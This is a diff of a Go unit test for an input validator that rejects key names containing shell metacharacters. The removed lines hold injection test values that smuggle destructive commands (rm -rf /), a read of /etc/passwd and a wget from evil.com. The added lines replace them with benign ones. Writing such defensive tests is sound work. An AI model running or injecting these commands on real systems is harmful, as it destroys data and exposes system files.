@@ -155,7 +155,7 @@ func TestInputValidationVulnerabilities(t *testing.T) {
 		},
 		{
 			name:    "command_substitution_dollar_paren",
-			key:     "test$(rm -rf /)",
+			key:     "test$(whoami)",
 			wantErr: true,
 			errMsg:  "key name cannot contain shell metacharacters",
 		},
@@ -173,19 +173,19 @@ func TestInputValidationVulnerabilities(t *testing.T) {
 		},
 		{
 			name:    "pipe_injection",
-			key:     "test|cat /etc/passwd",
+			key:     "test|grep secret",
 			wantErr: true,
 			errMsg:  "key name cannot contain shell metacharacters",
 		},
 		{
 			name:    "semicolon_command_separator",
-			key:     "test;rm -rf /tmp/*",
+			key:     "test;echo hello",
 			wantErr: true,
 			errMsg:  "key name cannot contain shell metacharacters",
 		},
 		{
 			name:    "ampersand_background_process",
-			key:     "test&wget evil.com/malware",
+			key:     "test&wget example.com",
 			wantErr: true,
 			errMsg:  "key name cannot contain shell metacharacters",
 		},
